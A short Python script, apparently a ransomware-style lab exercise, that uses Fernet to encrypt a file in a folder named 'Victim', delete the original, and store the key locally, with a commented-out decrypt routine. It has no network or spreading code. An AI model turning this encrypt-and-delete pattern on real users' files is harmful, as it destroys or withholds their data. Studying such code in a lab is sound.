from cryptography.fernet import Fernet
import os

def generate_key():
    return Fernet.generate_key()

def save_key(key, filename):
    with open(filename, "wb") as key_file:
        key_file.write(key)

def load_key(filename):
    return open(filename, "rb").read()

def encrypt_file(file_path, key, key_filename):
    with open(file_path, "rb") as f:
        ryan_plaintext = f.read()

    cipher_suite = Fernet(key)
    ryan_ciphertext = cipher_suite.encrypt(ryan_plaintext)

    with open(file_path + "-enc", "wb") as f_enc:
        f_enc.write(ryan_ciphertext)

    os.remove(file_path)  # Delete the original file after encryption

    save_key(key, key_filename + "-enc.key")  # Save the key after encryption

def decrypt_file(file_path, key, key_filename):
    with open(file_path, "rb") as f:
        ryan_ciphertext = f.read()

    cipher_suite = Fernet(key)
    
    try:
        ryan_plaintext = cipher_suite.decrypt(ryan_ciphertext)
    except Exception as e:
        print(f"Error during decryption: {e}")
        print(f"Key: {key}")
        print(f"Ciphertext length: {len(ryan_ciphertext)}")
        print(f"Ciphertext: {ryan_ciphertext}")
        return

    print(f"Decrypted content: {ryan_plaintext.decode('utf-8')}")

    with open(file_path[:-4] + "-dec", "wb") as f_dec:  # Adjusted output file name
        f_dec.write(ryan_plaintext)

    # Comment out the following line if you want to keep the original encrypted file
    os.remove(file_path)

    # Save the key after decryption with the correct filename
    save_key(key, key_filename[:-4] + "-dec.key")


# Example usage for decryption
#ryan_key = load_key("ryan_symmetric_key.key-enc.key") 
#print("Decrypting...")
#decrypt_file("/home/ryan/Victim/importantdoc.txt-enc", ryan_key, "ryan_symmetric_key.key-enc")
#print("Decryption completed.")



# Example usage
ryan_key = generate_key()
save_key(ryan_key, "ryan_symmetric_key.key")  # Save the key before any operation

encrypt_file("/home/ryan/Victim/importantdoc.txt", ryan_key, "ryan_symmetric_key.key")  # Comment out this line when decrypting

